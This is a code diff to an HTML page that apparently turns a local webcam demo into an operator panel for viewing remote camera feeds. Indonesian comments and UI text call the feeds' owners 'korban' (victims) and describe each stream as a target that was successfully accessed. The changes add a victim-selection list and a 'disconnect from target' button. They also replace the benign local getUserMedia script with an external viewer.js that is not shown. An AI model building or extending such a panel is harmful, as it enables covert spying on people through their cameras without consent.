@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Realtime Camera Listener</title>
+  <title>Realtime Camera Listener // SYSTEM MONITOR</title>
   <style>
     *{
       margin:0;
@@ -138,6 +138,12 @@
       box-shadow: 0 0 15px rgba(0,255,120,0.2);
     }
 
+    button.active{ /* Gaya untuk tombol korban yang aktif */
+      background: rgba(0,255,120,0.4) !important;
+      transform: translateY(-2px);
+      box-shadow: 0 0 15px rgba(0,255,120,0.3);
+    }
+
     button:disabled{
       opacity: 0.4;
       cursor: not-allowed;
@@ -154,13 +160,18 @@
       margin-top: 15px;
       z-index: 5;
       background: black;
+      display: flex; /* Tambahkan ini */
+      justify-content: center; /* Tambahkan ini */
+      align-items: center; /* Tambahkan ini */
     }
 
-    video{
+    /* Kita akan menampilkan gambar, bukan video murni */
+    .cameraBox img{
       width: 100%;
       height: 100%;
-      object-fit: cover;
+      object-fit: contain; /* Menggunakan contain biar gambar gak kepotong */
       filter: contrast(1.1) saturate(1.1);
+      display: block; /* Pastikan gambar ditampilkan */
     }
 
     .scanline{
@@ -216,6 +227,10 @@
     .terminal .ok{
       color: #00ff88;
     }
+    
+    .terminal .info{ /* Tambah ini buat info lokasi */
+      color: #00e0e0;
+    }
 
     footer{
       text-align: center;
@@ -226,6 +241,42 @@
       font-size: 12px;
     }
 
+    /* Tambahan untuk daftar korban */
+    #victimSelection {
+        margin-top: 15px;
+        margin-bottom: 10px;
+        padding: 10px;
+        border: 1px solid rgba(0,255,120,0.2);
+        border-radius: 8px;
+        background: rgba(0,0,0,0.4);
+        max-height: 150px;
+        overflow-y: auto;
+    }
+    #victimSelection button {
+        display: block;
+        width: 100%;
+        margin-bottom: 5px;
+        padding: 8px;
+        text-align: left;
+        font-size: 14px;
+        border: 1px solid rgba(0,255,120,0.3);
+        background: rgba(0,0,0,0.6);
+        color: #00ff88;
+    }
+    #victimSelection button:hover {
+        background: rgba(0,255,120,0.1);
+    }
+    #victimSelection button.active {
+        background: #00ff88;
+        color: #000;
+        font-weight: bold;
+    }
+    #noVictimsMessage {
+        color: #ffcc00;
+        text-align: center;
+        padding: 10px;
+        display: none; /* Sembunyikan secara default */
+    }
     @media(max-width: 900px){
       .container{
         grid-template-columns: 1fr;
@@ -247,19 +298,24 @@
 <div class="container">
 
   <div class="card">
-    <h2>📡 Live Camera Stream</h2>
+    <h2>📡 Live Camera Stream // Remote Feed</h2>
     <p>
-      Modul ini akan mengaktifkan kamera lokal menggunakan WebRTC API (getUserMedia).
-      Stream hanya berjalan jika user memberi izin browser.
+      Pilih ID target dari daftar di bawah untuk mengaktifkan feed kamera secara realtime.
+      Setiap stream mewakili target yang berhasil diakses.
     </p>
 
+    <!-- Tempat daftar korban akan muncul -->
+    <div id="victimSelection">
+      <p id="noVictimsMessage">Tidak ada korban aktif, sialan!</p>
+    </div>
+
     <div class="btns">
-      <button id="startBtn">START LISTENER</button>
-      <button id="stopBtn" disabled>STOP LISTENER</button>
+      <button id="disconnectBtn" disabled>DISCONNECT FROM TARGET</button>
     </div>
 
     <div class="cameraBox">
-      <video id="video" autoplay playsinline muted></video>
+      <!-- Kita akan menggunakan IMG tag sebagai pengganti VIDEO untuk menampilkan frame -->
+      <img id="remoteVideoStream" src="" alt="Menunggu koneksi ke target...">
       <div class="scanline"></div>
     </div>
 
@@ -279,102 +335,8 @@
   © 2026 // CYBER LISTENER UI // ACCESS CONTROLLED BY BROWSER PERMISSION
 </footer>
 
-<script>
-  const startBtn = document.getElementById("startBtn");
-  const stopBtn = document.getElementById("stopBtn");
-  const video = document.getElementById("video");
-  const terminal = document.getElementById("terminal");
-  const statusText = document.getElementById("statusText");
-
-  let stream = null;
-  let fakeScanInterval = null;
-
-  function log(msg, type="ok"){
-    const line = document.createElement("span");
-    line.className = type;
-    const time = new Date().toLocaleTimeString();
-    line.textContent = `[${time}] ${msg}`;
-    terminal.appendChild(line);
-    terminal.scrollTop = terminal.scrollHeight;
-  }
-
-  function setStatus(text, colorClass="warn"){
-    statusText.innerHTML = `STATUS: <span class="${colorClass}">${text}</span>`;
-  }
-
-  function startFakeScanning(){
-    fakeScanInterval = setInterval(() => {
-      const messages = [
-        "Initializing camera module...",
-        "Establishing secure stream channel...",
-        "Syncing realtime frame packets...",
-        "Scanning environment objects...",
-        "Tracking motion vectors...",
-        "Encrypting output stream...",
-        "Listener running stable..."
-      ];
-      const random = messages[Math.floor(Math.random() * messages.length)];
-      log(random, "ok");
-    }, 1200);
-  }
-
-  function stopFakeScanning(){
-    if(fakeScanInterval){
-      clearInterval(fakeScanInterval);
-      fakeScanInterval = null;
-    }
-  }
-
-  startBtn.addEventListener("click", async () => {
-    log("Requesting camera permission...", "warn");
-    setStatus("REQUESTING PERMISSION...", "warn");
-
-    try{
-      stream = await navigator.mediaDevices.getUserMedia({
-        video: { width: 1280, height: 720 },
-        audio: false
-      });
-
-      video.srcObject = stream;
-      log("Camera stream connected successfully.", "ok");
-      log("Listener started: realtime frames captured.", "ok");
-
-      setStatus("LISTENER ACTIVE", "ok");
-
-      startBtn.disabled = true;
-      stopBtn.disabled = false;
-
-      startFakeScanning();
-
-    } catch(err){
-      log("Permission denied or camera not available.", "err");
-      log("Error: " + err.message, "err");
-      setStatus("ACCESS DENIED", "err");
-    }
-  });
-
-  stopBtn.addEventListener("click", () => {
-    if(stream){
-      stream.getTracks().forEach(track => track.stop());
-      stream = null;
-      video.srcObject = null;
-    }
-
-    stopFakeScanning();
-
-    log("Camera listener stopped.", "warn");
-    setStatus("IDLE", "warn");
-
-    startBtn.disabled = false;
-    stopBtn.disabled = true;
-  });
-
-  // boot log
-  log("System booting...", "warn");
-  log("Loading camera modules...", "warn");
-  log("UI initialized successfully.", "ok");
-  log("Waiting for user action.", "warn");
-</script>
+<!-- Ini adalah script JavaScript baru yang menggabungkan logika lama kita dengan UI lo -->
+<script src="/viewer.js"></script>
 
 </body>
 </html>
